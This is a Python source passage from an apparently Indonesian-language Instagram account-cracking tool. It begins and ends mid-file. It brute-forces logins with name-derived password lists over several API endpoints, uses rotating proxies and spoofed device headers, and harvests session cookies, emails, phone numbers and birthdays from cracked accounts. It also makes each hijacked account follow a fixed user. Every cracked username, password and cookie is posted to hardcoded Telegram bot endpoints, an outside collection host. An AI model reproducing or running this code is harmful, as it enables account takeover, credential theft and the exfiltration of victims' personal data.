           if self.d not in self.i:
              if len(self.d) <=5:pass
              else:self.i.append(self.d)
       return self.i

   def cek_key(self, OS=None):
       try:
           if os.path.isfile('data/.keys.txt') is True:
              self.key = open('data/.keys.txt','r').read()
              self.xyz = requests.get('https://paste.tc/raw/licensu-64').text
              self.pok = re.findall(self.key + '.*', self.xyz)[0]
           else:
              if not OS:exit()
              else:pass
       except IndexError:
           if OS == True:pass
           else:exit('\nLicensi not found!')

   def normalisasi_teks(self, teks):
     return unidecode(teks)
   #-> Password
   def Exekusy2(self):
       self.KeyCek = self.cek_key(True)
       sandi_tambahan = []
       tmbah = Console().input('[bold white][[bold green]+[bold white]] [bold green]Password Tambahan(Y/T): ')
       if tmbah in ['Y','y','ya']:
          tambahan = Console().input('[bold white][[bold green]+[bold white]] [bold green]Gunakan Koma Untuk Pemisah(Exp:jatim,sayang,kamunanya): ').split(',')
          for self.tambah in tambahan:
            if len(self.tambah)<=5:pass
            else:sandi_tambahan.append(self.tambah)
       else:
           pass
       pake = Console().input('[bold white][[bold green]+[bold white]] [bold green]Menggunakan Proxy(Y/T): ')
       if pake in ['Y','y','ya']:
         gaweprx.append('ya')
       else:
         pass
       sandine = "03"
       if sandine not in ['1','01','2','02','3','03','4','04']:
          print(f'\n{P}[{K2}!{P}] {K2}Pilihan Tidak Tersedia')
          self.Exekusy2()

       elif sandine in ['4','04']:
          sandi_tambahan = []
          self.MyRich('[white]Gunakan Koma Untuk Pemisahan, Pastikan sandi harus 6/Lebih!',True)
          tambahan = Console(style=temane[0]).input(f'   └──> ').split(',')
          for self.tambah in tambahan:
              if len(self.tambah)<=5:pass
              else:sandi_tambahan.append(self.tambah)

       console.print(f"[bold magem][[bold green]+[bold white]] [bold green]Akun OK Tersimpan Di /sdcard/RESULT/OK-Instagram-{file_ok}.[/bold green]")
       console.print(f"[bold white][[bold yellow]+[bold white]] [bold yellow]Akun CP Tersimpan Di /sdcard/RESULT/CP-Instagram-{file_ok}.[/bold yellow]\n")

       """self.MyRich(f'\
[green]Akun Succes Save In: RESULT/OK-Instagram-{file_ok}\n\
Akun Checkpoint Save In: RESULT/CP-Instagram-{file_ok}')"""

       self.mayb = self.OverPower()
       with ThreadPoolExecutor(max_workers=35) as exe:
          for data in self.id:
              try:
                  idf, nama = data.split('|')
                  nama_biasa = self.normalisasi_teks(nama)  # Normalisasi nama
                  pw = self.pwdc(nama_biasa, idf, sandine)
                  #print(pw)
                  #pw = self.pwdc(nama, idf, sandine)
                  if tmbah== 'y' or tmbah== 'ya' or tmbah == 'Y':
                     pw = pw + sandi_tambahan
                  else:pw = pw
                  if '1' in self.MethodType:
                      exe.submit(self.Login_Threads, idf, pw)
                  elif '2' in self.MethodType:
                      exe.submit(self.Login_Api, idf, pw)
                  elif '3' in self.MethodType:
                      exe.submit(self.Login_Ajax, idf, pw)
                  else:
                      exe.submit(self.Login_Threads, idf, pw)
              except:pass

       print(f'\n[bold white][[bold green]+[bold white]] Account OK : [bold green]{self.ResultSuccess}{P}\n[bold white][[bold yellow]+[bold white]] Account CP : [bold yellow]{self.ResultChechpoint}[bold white]\n')
       exit(0)

   #-> Info Akun Terkait
   def Fafo(self, cokie):
       try:
           self.c = re.findall('csrftoken=(.*?);',str(cokie))
           self.x = {"Host": "www.instagram.com","content-length": "0","x-requested-with": "XMLHttpRequest","x-csrftoken": "tJdFh5wJTuFDQZvpadl2kTm0LGRSkH8w" if len(self.c) == 0 else self.c[0],"x-ig-app-id": "936619743392459","x-instagram-ajax": "1011212827","user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36","content-type": "application/x-www-form-urlencoded","accept": "*/*","x-asbd-id": "129477","cookie":cokie}
           self.r = requests.post('https://www.instagram.com/api/v1/web/fxcal/ig_sso_users/', headers = self.x).json()
           if 'fbAccount' in str(self.r):
              self.nama = self.r['fbAccount']['display_name']
              self.Reqz = requests.get('https://accountscenter.instagram.com/profiles/', cookies = {'cookie':cokie}).text
              self.User = re.search('{"__typename":"XFBFXFBAccountInfo","id":"(.*?)"}', str(self.Reqz)).group(1)
           else:
              self.nama = None
              self.User = None
       except:
           self.nama = 'Requests Error!'
           self.User = 'Requests Error!'
       self.aku = '%s%s|%s'%(H,self.User, self.nama)
       return(self.aku)

   #-> Custom Android ID
   def Android_ID(self, users, passwd):
       self.xyz = hashlib.md5()
       self.xyz.update(users.encode('utf-8') + passwd.encode('utf-8'))
       self.hex = self.xyz.hexdigest()
       self.xyz.update(self.hex.encode('utf-8') + '12345'.encode('utf-8'))
       return self.xyz

   #-> Info result OK
   def friends_user(self, cookies):
       try:
            InfoHeaders = {'x-ig-app-locale': 'in_ID','x-ig-device-locale': 'in_ID','x-ig-mapped-locale': 'id_ID','x-bloks-version-id': '8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb','x-bloks-is-layout-rtl': 'false','x-ig-capabilities': '3brTv10=','x-ig-app-id': '567067343352427','priority': 'u=3','user-agent': 'Instagram 275.0.0.27.98 Android (25/7.1.2; 240dpi; 720x1280; Google/google; google Pixel 2; x86; android_x86; in_ID; 458229257)','accept-language': 'id-ID, en-US','x-fb-http-engine': 'Liger','x-fb-client-ip': 'True','x-fb-server-cluster': 'True'}
            edit = {'edit': 'true'}
            info = requests.get('https://i.instagram.com/api/v1/accounts/current_user/', params=edit, headers=InfoHeaders, cookies = {'cookie':cookies}).json()['user']
            info_email = info['email']
            info_full_nama = info['full_name']
            info_username = info['username']
            info_nomor_hp = info['phone_number']
            info_akun_id = info['pk_id']
            info_birthday = info['birthday']
            info_kedua = requests.get(f'https://i.instagram.com/api/v1/users/{info_akun_id}/info/', headers=InfoHeaders, cookies = {'cookie':cookies}).json()['user']
            info_followers = info_kedua['follower_count']
            info_following = info_kedua['following_count']
            info_postingan = info_kedua['media_count']
            return info_email,info_full_nama,info_username,info_nomor_hp,info_birthday,info_followers,info_following, info_postingan
       except:return None

   #-> Info No Login
   def friends_user_chek(self, username):
       try:
           self.head.update({'Host': 'www.instagram.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'none'})
           req = requests.get(f'https://www.instagram.com/api/v1/users/web_profile_info/?username={username}', headers=self.head).json()['data']['user']
           ikut,mengikut,posting = req['edge_followed_by']['count'],req['edge_follow']['count'],req['edge_owner_to_timeline_media']['count']
           return(ikut,mengikut,posting)
       except:return(None,None,None)

   #-> Convert cokie dict {}
   def Convert(self, dict_c):
       cokz = ';'.join(['%s=%s'%(x,y) for x,y in dict_c.items()])
       return cokz

   def timezone_offset(self):
       self.tim = datetime.datetime.now(pytz.timezone('Asia/Jakarta'))
       self.ofs = self.tim.utcoffset().total_seconds()/60/60
       return self.ofs

   def SetMid(self):
       return '' if len(self.MID) == 0 else random.choice(self.MID)

   def Blok_ID(self):
       self.v23 = 'edf962326770574232e3938baf0c2faebdbb23703933345b000509f560bd9965'
       self.v39 = 'c55a52bd095e76d9a88e2142eaaaf567c093da6c0c7802e7a2f101603d8a7d49'
       self.v09 = '9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a'
       return(random.choice([self.v09,self.v39,self.v23]))

   # pkg install iproute2
   def UseNet(self):
       #self.net = []
       #for self.y in os.popen('ip neigh show'):self.net.append(self.y)
       #if 'wlan' in str(self.net) or 'wlan0' in str(self.net):return('WIFI','WIFI')
       #else:return('MOBILE.LTE','MOBILE(LTE)')
       return('MOBILE.LTE','MOBILE(LTE)')

   def HeadersApiLogin(self):
       return {
          'host': 'b.i.instagram.com',
          'x-ig-app-locale': 'in_ID',
          'x-ig-device-locale': 'in_ID',
          'x-ig-mapped-locale': 'id_ID',
          'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-3',
          'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
          'x-ig-bandwidth-speed-kbps': '-1.000',
          'x-ig-bandwidth-totalbytes-b': '0',
          'x-ig-bandwidth-totaltime-ms': '0',
          'x-bloks-version-id': self.Blok_ID(),
          'x-ig-www-claim': '0',
          'x-bloks-is-prism-enabled': 'false',
          'x-bloks-is-layout-rtl': 'false',
          'x-ig-device-id': 'b7b95886-a663-41e4-8025-941a72c9ac4d',
          'x-ig-family-device-id': '2ce88cf6-20e8-4b2e-bb67-8d8ed5dda357',
          'x-ig-android-id': 'android-f4d8eb2bd1b86a47',
          'x-ig-timezone-offset': str(self.timezone_offset()),
          'x-fb-connection-type': self.UseNet()[0],
          'x-ig-connection-type': self.UseNet()[1],
          'x-ig-capabilities': '3brTv10=',
          'x-ig-app-id': '567067343352427',
          'priority': 'u=3',
          'user-agent': Useragent().useragent_threads(),
          'accept-language': 'id-ID, en-US',
          'x-mid': str(self.SetMid()),
          'ig-intended-user-id': '0',
          'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'content-length': '2702',
          'x-fb-http-engine': 'Liger',
          'x-fb-client-ip': 'True',
          'x-fb-server-cluster': 'True'
       }

   def ChekDuplikat(self, users):
       if str(users) not in self.bugbaru:
          self.bugbaru.append(users)
          return True
       else:
          return False
          
   def follow_target(self,cookie):
        try:
          csrftoken = re.search(r'csrftoken=([^;]+)', str(cookie)).group(1)
          HD3 = {

                 "Host": "www.instagram.com",
                 "content-length": "108",
                 "sec-ch-ua": '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
                 "x-ig-app-id": "1217981644879628",
                 "x-ig-www-claim": "hmac.AR2bJKYJnPYmZqv19akfq13Zn4tplhuXb9TC9PwFk03Dg4v5",
                 "sec-ch-ua-mobile": "?1",
                 "x-instagram-ajax": "1007404816",
                 "user-agent": "Mozilla/5.0 (Linux; Android 8.0.0; G3226 Build/48.1.A.2.109; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36 Instagram 160.0.0.25.132 Android (26/8.0.0; 540dpi; 1080x1758; Sony; G3226; G3226; mt6757; pt_BR; 246889074)",
                 "viewport-width": "360",
                 "content-type": "application/x-www-form-urlencoded",
                 "accept": "*/*",
                 "x-requested-with": "XMLHttpRequest",
                 "x-asbd-id": "198387",
                 "sec-ch-ua-full-version-list": '"Chromium";v="110.0.5481.153", "Not A(Brand";v="24.0.0.0", "Google Chrome";v="110.0.5481.153"',
                 "x-csrftoken": csrftoken,
                 "sec-ch-prefers-color-scheme": "light",
                 "sec-ch-ua-platform": "Android",
                 "origin": "https://www.instagram.com",
                 "sec-fetch-site": "same-origin",
                 "sec-fetch-mode": "cors",
                 "sec-fetch-dest": "empty",
                 "referer": "https://www.instagram.com/the.jpexec_/",
                 "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                 "cookie": cookie
            
          }
          punyaku = {
                 "container_module":"profile",
                 "nav_chain":"PolarisProfileRoot:profilePage:1:via_cold_start",
                 "user_id":"47832812621"
            
          }
          API = requests.post(f'https://www.instagram.com/api/v1/friendships/create/47832812621/', headers=HD3, data=punyaku).text
        except:pass
   
   # >>>>>> METHOD THREADS ONLY <<<<<< 
   def Login_Threads(self, users, password):
       global file_ok
       try:
           for pwb in password:
               session = requests.Session()
               session.headers.update({**self.HeadersApiLogin(),
                    'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
                    'x-ig-bandwidth-speed-kbps': '{}'.format(random.randint(7000,10000)),
                    'x-ig-bandwidth-totalbytes-b': str(random.randint(500000,900000)),
                    'x-ig-bandwidth-totaltime-ms': str(random.randint(1000,9000)),
                    'x-ig-device-id': str(uuid.uuid4()),
                    'x-ig-family-device-id': str(uuid.uuid4()),
                    'x-ig-android-id': 'android-%s'%(self.Android_ID(users,pwb).hexdigest()[:16]),
                    'x-ig-timezone-offset': str(self.timezone_offset()),
                    'x-ig-app-id': '124024574287414',
                    'user-agent': Useragent().useragent_threads(),
                    # self.HeadersApiLogin()['user-agent'].replace('Instagram','Barcelona')
               })
               passwd  = '#PWD_INSTAGRAM:0:%s:%s'%(int(time.time()), pwb)
               params_ = f'params=%7B%22client_input_params%22%3A%7B%22password%22%3A%22{urllib.parse.quote_plus(passwd)}%22%2C%22contact_point%22%3A%22{str(users)}%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C%22event_flow%22%3A%22login_manual%22%2C%22openid_tokens%22%3A%7B%7D%2C%22machine_id%22%3A%22%22%2C%22family_device_id%22%3A%22{session.headers["x-ig-family-device-id"]}%22%2C%22accounts_list%22%3A%5B%5D%2C%22try_num%22%3A1%2C%22has_whatsapp_installed%22%3A0%2C%22login_attempt_count%22%3A1%2C%22device_id%22%3A%22{session.headers["x-ig-android-id"]}%22%2C%22headers_infra_flow_id%22%3A%22%22%2C%22auth_secure_device_id%22%3A%22%22%2C%22encrypted_msisdn%22%3A%22%22%2C%22sso_token_map_json_string%22%3A%22%22%2C%22device_emails%22%3A%5B%5D%2C%22lois_settings%22%3A%7B%22lara_override%22%3A%22%22%2C%22lois_token%22%3A%22%22%7D%2C%22client_known_key_hash%22%3A%22%22%2C%22event_step%22%3A%22home_page%22%2C%22secure_family_device_id%22%3A%22%22%7D%2C%22server_params%22%3A%7B%22is_caa_perf_enabled%22%3A0%2C%22is_platform_login%22%3A0%2C%22is_from_logged_out%22%3A0%2C%22login_credential_type%22%3A%22none%22%2C%22should_trigger_override_login_2fa_action%22%3A0%2C%22is_from_logged_in_switcher%22%3A0%2C%22family_device_id%22%3A%22{session.headers["x-ig-family-device-id"]}%22%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C%22credential_type%22%3A%22password%22%2C%22waterfall_id%22%3A%22{str(uuid.uuid4())}%22%2C%22username_text_input_id%22%3A%22u7x8ax%3A58%22%2C%22password_text_input_id%22%3A%22u7x8ax%3A59%22%2C%22layered_homepage_experiment_group%22%3Anull%2C%22offline_experiment_group%22%3A%22caa_iteration_v3_perf_ig_4%22%2C%22INTERNAL_INFRA_THEME%22%3A%22harm_f%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A182729300100110%2C%22device_id%22%3A%22{session.headers["x-ig-android-id"]}%22%2C%22server_login_source%22%3A%22login%22%2C%22login_source%22%3A%22Login%22%2C%22caller%22%3A%22gslr%22%2C%22should_trigger_override_login_success_action%22%3A0%2C%22ar_event_source%22%3A%22login_home_page%22%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%7D%7D&bk_client_context=%7B%22bloks_version%22%3A%225f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73'
               session.headers.update({'content-length':str(len(params_))})
               if 'ya' in gaweprx:
                  proxy = {'http': 'socks5://'+str(random.choice(open(f"{path}/.prx.txt","r").read().splitlines()))}
                  _respon = session.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data=params_, proxies=proxy, allow_redirects =True)
               else:
                  _respon = session.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data=params_, allow_redirects =True)
               if 'logged_in_user' in str(_respon.text.replace('\\','')):
                    self.Pepek = self.ChekDuplikat(users)
                    if self.Pepek is False:break
                    cokie = {}
                    try:
                        cok = re.search('"headers":"{"IG-Set-Authorization": "(.*?)"', str(_respon.text.replace('\\',''))).group(1)
                        xyz = base64.b64decode(cok.split(':')[2]).decode()
                        ds_id = re.search('{"ds_user_id":"(\d+)"', str(xyz)).group(1)
                        sn_id = re.search('"sessionid":"(.*?)"', str(xyz)).group(1)
                        cokie.update({"ds_user_id":f"{ds_id}","sessionid":f"{sn_id}"})
                        cokie.update(session.cookies.get_dict())
                    except: pass
                    self.ResultSuccess +=1
                    cookie = self.Convert(cokie)
                    self.follow_target(cookie)
                    akun_info = self.friends_user(cookie)
                    if akun_info is not None:
                       info_email,info_full_nama,info_username,info_nomor_hp,info_birthday,info_followers,info_following, info_postingan = akun_info
                    else:
                       info_followers, info_following, none_postingan = self.friends_user_chek(users)
                       info_email     = ''
                       info_full_nama = ''
                       info_username  = users
                       info_nomor_hp  = ''
                       info_birthday  = ''
                       info_postingan = ''
                    fbacc = self.Fafo(cookie)
                    akunfb = fbacc
                    if True in self.UbahData:
                       self.a2f = self.TahapPertama2f(cookie)
                       self.cex = 'A2F Di Aktifkan' if self.a2f['success-a2f'] is True else 'A2F Tidak Aktif'
                       self.aut = self.a2f['SecretKey']
                       self.pem = self.a2f['kode-pemulihan']
                       self.PWX = self.SandiBaru(cookie, pwb)
                       Aku_Suka(Tobrut(f"""\r[bold green] methode      : Threads
 username     : {info_username}
 password     : {self.PWX}
 nomor hp     : {info_nomor_hp}
 email        : {info_email}
 birthday     : {info_birthday}
 status a2f   : {self.cex}
 authentikasi : {self.aut}
 pemulihan    : {self.pem}
 pengikut     : {info_followers}
 mengikuti   : {info_following}
 Facebook acc : {akunfb}
 cookie       : {cookie}""",title=f"[bold white][ [bold green]MIKU-OK[bold white]]",style=f"bold green"))
                    else:
                       message = f"""

🧑‍💻 **Username:** `{info_username}`
🔑 **Password:** `{pwb}`
📊 **Statistik :** `{info_followers}•{info_following}•{info_postingan}`
🍪 **Cookie ID:** `{cookie}`
📱 **Device:** `{Useragent().useragent_threads()}`
"""
                       url = f"https://api.telegram.org/bot7809116049:AAEEzfAlClpTZrtjuEKCdF734DO4QH0nAKs/sendMessage"
                       payload = {
    "chat_id": "8047025010",
    "text": message,
    "parse_mode": "Markdown"
                         
                       }
                       response = requests.post(url, data=payload)
                       print(f"[bold white][[bold green]+[bold white]] [bold green]ACCOUNT SUCCESSFULLY [bold white][[bold green]+[bold white]]")
                       print(f"[bold white][[bold green]+[bold white]] [bold green]Account     : {info_username}|{pwb}")
                       print(f"[bold white][[bold green]+[bold white]] [bold green]Data Account: {info_followers}|{info_following}|{info_postingan}")
                       print(f"[bold white][[bold green]+[bold white]] [bold green]Cookie      : {cookie}[bold white]")
                       print()
                       self.aut = None
                       self.pem = None
                       self.PWX = pwb
                    open('/sdcard/RESULT/OK-Instagram-%s.txt'%(file_ok),'a', encoding='utf-8').write(f'{info_username}|{self.PWX}|{info_followers}|{info_following}|{info_postingan}|{cookie}\n')
                    break
               elif 'https://i.instagram.com/challenge7' in str(_respon.text.replace('\\','')):
                    followers, following, postingan = self.friends_user_chek(users)
                    print(f"[bold white][[bold yellow]+[bold white]] [bold yellow]ACCOUNT CHECKPOINTS [bold white][[bold yellow]+[bold white]]")
                    print(f"[bold white][[bold yellow]+[bold white]] [bold yellow]Account     : {users}|{pwb}")
                    print(f"[bold white][[bold yellow]+[bold white]] [bold yellow]Data Account: {followers}|{following}|{postingan}")
                    print(f"[bold white][[bold yellow]+[bold white]] [bold yellow]Useragent   : {Useragent().useragent_threads()}[bold white]")
                    print()
                    message = f"""
🧑‍💻 **Username:** `{users}`
🔑 **Password:** `{pwb}`
📊 **Statistik :** `{followers}•{following}•{postingan}`
📱 **Device:** `{Useragent().useragent_threads()}`
"""
                    url = f"https://api.telegram.org/bot7473174899:AAHQ5Ba-D38z3c9purbV8kGEhezCX6fe3kU/sendMessage"
                    payload = {
    "chat_id": "8047025010",
    "text": message,
    "parse_mode": "Markdown"
                      
                    }
                    response = requests.post(url, data=payload)
                    open('/sdcard/RESULT/CP-Instagram-%s.txt'%(file_ok),'a', encoding='utf-8').write(f'{users}|{pwb}|{followers}/{following}/{postingan}\n')
                    self.ResultChechpoint +=1
                    break
               elif 'ip_block' in str(_respon.text):
                  Console().print(f'[bold red] IP_BLOCK [bold white]{self.Loop}/{len(self.id)} [bold green]OK:-{self.ResultSuccess} [bold yellow]CP:-{self.ResultChechpoint}[bold white]',end='\r')
                  time.sleep(15)
           self.Loop +=1
           Console().print(f'[bold magenta] THREADS [bold white]{self.Loop}/{len(self.id)} [bold green]OK:-{self.ResultSuccess} [bold yellow]CP:-{self.ResultChechpoint}[bold white]',end='\r')
       #except Exception as e:print(e)
       except (AttributeError,requests.exceptions.ConnectionError):
          time.sleep(17)
   
   def Login_Ajax(self, users, password):
       global file_ok
       try:
           for pwb in password:
               session = requests.Session()
               session.headers.update({**self.HeadersApiLogin(),
                    'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
                    'x-ig-bandwidth-speed-kbps': '{}'.format(random.randint(7000,10000)),
                    'x-ig-bandwidth-totalbytes-b': str(random.randint(500000,900000)),
                    'x-ig-bandwidth-totaltime-ms': str(random.randint(1000,9000)),
                    'x-ig-device-id': str(uuid.uuid4()),
                    'x-ig-family-device-id': str(uuid.uuid4()),
                    'x-ig-android-id': 'android-%s'%(self.Android_ID(users,pwb).hexdigest()[:16]),
                    'x-ig-timezone-offset': str(self.timezone_offset()),
                    'x-ig-app-id': '124024574287414',
                    'user-agent': Useragent().useragent_threads(),
                    # self.HeadersApiLogin()['user-agent'].replace('Instagram','Barcelona')
               })
               passwd  = '#PWD_INSTAGRAM:0:%s:%s'%(int(time.time()), pwb)
               params_ = f'params=%7B%22client_input_params%22%3A%7B%22password%22%3A%22{urllib.parse.quote_plus(passwd)}%22%2C%22contact_point%22%3A%22{str(users)}%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C%22event_flow%22%3A%22login_manual%22%2C%22openid_tokens%22%3A%7B%7D%2C%22machine_id%22%3A%22%22%2C%22family_device_id%22%3A%22{session.headers["x-ig-family-device-id"]}%22%2C%22accounts_list%22%3A%5B%5D%2C%22try_num%22%3A1%2C%22has_whatsapp_installed%22%3A0%2C%22login_attempt_count%22%3A1%2C%22device_id%22%3A%22{session.headers["x-ig-android-id"]}%22%2C%22headers_infra_flow_id%22%3A%22%22%2C%22auth_secure_device_id%22%3A%22%22%2C%22encrypted_msisdn%22%3A%22%22%2C%22sso_token_map_json_string%22%3A%22%22%2C%22device_emails%22%3A%5B%5D%2C%22lois_settings%22%3A%7B%22lara_override%22%3A%22%22%2C%22lois_token%22%3A%22%22%7D%2C%22client_known_key_hash%22%3A%22%22%2C%22event_step%22%3A%22home_page%22%2C%22secure_family_device_id%22%3A%22%22%7D%2C%22server_params%22%3A%7B%22is_caa_perf_enabled%22%3A0%2C%22is_platform_login%22%3A0%2C%22is_from_logged_out%22%3A0%2C%22login_credential_type%22%3A%22none%22%2C%22should_trigger_override_login_2fa_action%22%3A0%2C%22is_from_logged_in_switcher%22%3A0%2C%22family_device_id%22%3A%22{session.headers["x-ig-family-device-id"]}%22%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C%22credential_type%22%3A%22password%22%2C%22waterfall_id%22%3A%22{str(uuid.uuid4())}%22%2C%22username_text_input_id%22%3A%22u7x8ax%3A58%22%2C%22password_text_input_id%22%3A%22u7x8ax%3A59%22%2C%22layered_homepage_experiment_group%22%3Anull%2C%22offline_experiment_group%22%3A%22caa_iteration_v3_perf_ig_4%22%2C%22INTERNAL_INFRA_THEME%22%3A%22harm_f%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A182729300100110%2C%22device_id%22%3A%22{session.headers["x-ig-android-id"]}%22%2C%22server_login_source%22%3A%22login%22%2C%22login_source%22%3A%22Login%22%2C%22caller%22%3A%22gslr%22%2C%22should_trigger_override_login_success_action%22%3A0%2C%22ar_event_source%22%3A%22login_home_page%22%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%7D%7D&bk_client_context=%7B%22bloks_version%22%3A%225f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73'
               session.headers.update({'content-length':str(len(params_))})
               if 'ya' in gaweprx:
                  proxy = {'http': 'socks5://'+str(random.choice(open(f"{path}/.prx.txt","r").read().splitlines()))}
                  _respon = session.post('https://b.i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data=params_, proxies=proxy, allow_redirects =True)
               else:
                  _respon = session.post('https://b.i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data=params_, allow_redirects =True)
               if 'logged_in_user' in str(_respon.text.replace('\\','')):
                    self.Pepek = self.ChekDuplikat(users)
                    if self.Pepek is False:break
                    cokie = {}
                    try:
                        cok = re.search('"headers":"{"IG-Set-Authorization": "(.*?)"', str(_respon.text.replace('\\',''))).group(1)
                        xyz = base64.b64decode(cok.split(':')[2]).decode()
                        ds_id = re.search('{"ds_user_id":"(\d+)"', str(xyz)).group(1)
                        sn_id = re.search('"sessionid":"(.*?)"', str(xyz)).group(1)
                        cokie.update({"ds_user_id":f"{ds_id}","sessionid":f"{sn_id}"})
                        cokie.update(session.cookies.get_dict())
                    except: pass
                    self.ResultSuccess +=1
                    cookie = self.Convert(cokie)
                    akun_info = self.friends_user(cookie)
                    self.follow_target(cookie)
                    if akun_info is not None:
                       info_email,info_full_nama,info_username,info_nomor_hp,info_birthday,info_followers,info_following, info_postingan = akun_info
                    else:
                       info_followers, info_following, none_postingan = self.friends_user_chek(users)
                       info_email     = ''
                       info_full_nama = ''
                       info_username  = users
                       info_nomor_hp  = ''
                       info_birthday  = ''
                       info_postingan = ''
                    fbacc = self.Fafo(cookie)
                    akunfb = fbacc
                    if True in self.UbahData:
                       self.a2f = self.TahapPertama2f(cookie)
                       self.cex = 'A2F Di Aktifkan' if self.a2f['success-a2f'] is True else 'A2F Tidak Aktif'
                       self.aut = self.a2f['SecretKey']
                       self.pem = self.a2f['kode-pemulihan']
                       self.PWX = self.SandiBaru(cookie, pwb)
                       Aku_Suka(Tobrut(f"""\r[bold green] methode      : Threads
 username     : {info_username}
 password     : {self.PWX}
 nomor hp     : {info_nomor_hp}
 email        : {info_email}
 birthday     : {info_birthday}
 status a2f   : {self.cex}
 authentikasi : {self.aut}
 pemulihan    : {self.pem}
 pengikut     : {info_followers}
 mengikuti   : {info_following}
 Facebook acc : {akunfb}
 cookie       : {cookie}""",title=f"[bold white][ [bold green]MIKU-OK[bold white]]",style=f"bold green"))
                    else:
                       message = f"""

🧑‍💻 **Username:** `{info_username}`

🔑 **Password:** `{pwb}`
📊 **Statistik :** `{info_followers}•{info_following}•{info_postingan}`
🍪 **Cookie ID:** `{cookie}`
📱 **Device:** `{Useragent().useragent_threads()}`
"""
                       url = f"https://api.telegram.org/bot7809116049:AAEEzfAlClpTZrtjuEKCdF734DO4QH0nAKs/sendMessage"
                       payload = {
    "chat_id": "8047025010",
    "text": message,
    "parse_mode": "Markdown"
                         
                       }
                       response = requests.post(url, data=payload)
                       print(f"[bold white][[bold green]+[bold white]] [bold green]ACCOUNT SUCCESSFULLY [bold white][[bold green]+[bold white]]")
                       print(f"[bold white][[bold green]+[bold white]] [bold green]Account     : {info_username}|{pwb}")
                       print(f"[bold white][[bold green]+[bold white]] [bold green]Data Account: {info_followers}|{info_following}|{info_postingan}")
                       print(f"[bold white][[bold green]+[bold white]] [bold green]Cookie      : {cookie}[bold white]")
                       print()
                       self.aut = None
                       self.pem = None
                       self.PWX = pwb
                    open('/sdcard/RESULT/OK-Instagram-%s.txt'%(file_ok),'a', encoding='utf-8').write(f'{info_username}|{self.PWX}|{info_followers}|{info_following}|{info_postingan}|{cookie}\n')
                    break
               elif 'https://i.instagram.com/challenge' in str(_respon.text.replace('\\','')):
                    followers, following, postingan = self.friends_user_chek(users)
                    print(f"[bold white][[bold yellow]+[bold white]] [bold yellow]ACCOUNT CHECKPOINTS [bold white][[bold yellow]+[bold white]]")
                    print(f"[bold white][[bold yellow]+[bold white]] [bold yellow]Account     : {users}|{pwb}")
                    print(f"[bold white][[bold yellow]+[bold white]] [bold yellow]Data Account: {followers}|{following}|{postingan}")
                    print(f"[bold white][[bold yellow]+[bold white]] [bold yellow]Useragent   : {Useragent().useragent_threads()}[bold white]")
                    print()
                    message = f"""

🧑‍💻 **Username:** `{users}`

🔑 **Password:** `{pwb}`
📊 **Statistik :** `{followers}•{following}•{postingan}`
📱 **Device:** `{Useragent().useragent_threads()}`
"""
                    url = f"https://api.telegram.org/bot7473174899:AAHQ5Ba-D38z3c9purbV8kGEhezCX6fe3kU/sendMessage"
                    payload = {
    "chat_id": "8047025010",
    "text": message,
    "parse_mode": "Markdown"
                      
                    }
                    response = requests.post(url, data=payload)
                    open('/sdcard/RESULT/CP-Instagram-%s.txt'%(file_ok),'a', encoding='utf-8').write(f'{users}|{pwb}|{followers}/{following}/{postingan}\n')
                    self.ResultChechpoint +=1
                    break
               elif 'ip_block' in str(_respon.text):
                  Console().print(f'[bold red] IP_BLOCK [bold white]{self.Loop}/{len(self.id)} [bold green]OK:-{self.ResultSuccess} [bold yellow]CP:-{self.ResultChechpoint}[bold white]',end='\r')
                  time.sleep(15)
           self.Loop +=1
           Console().print(f'[bold magenta] AJAX [bold white]{self.Loop}/{len(self.id)} [bold green]OK:-{self.ResultSuccess} [bold yellow]CP:-{self.ResultChechpoint}[bold white]',end='\r')
       #except Exception as e:print(e)
       except (AttributeError,requests.exceptions.ConnectionError):
          time.sleep(15)
          
   #-> LOGIN APK INSTAGRAM
   def Login_Api(self, users, password):
       global file_ok
       try:
           for pwb in password:
               ua_generate = Useragent().useragent_threads().replace('Barcelona', 'Instagram')
               session = requests.Session()
               byps = requests.Session()
               hash = hashlib.md5()
               hash.update(users.encode('utf-8') + pwb.encode('utf-8'))
               hex_ = hash.hexdigest()
               hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8')) 
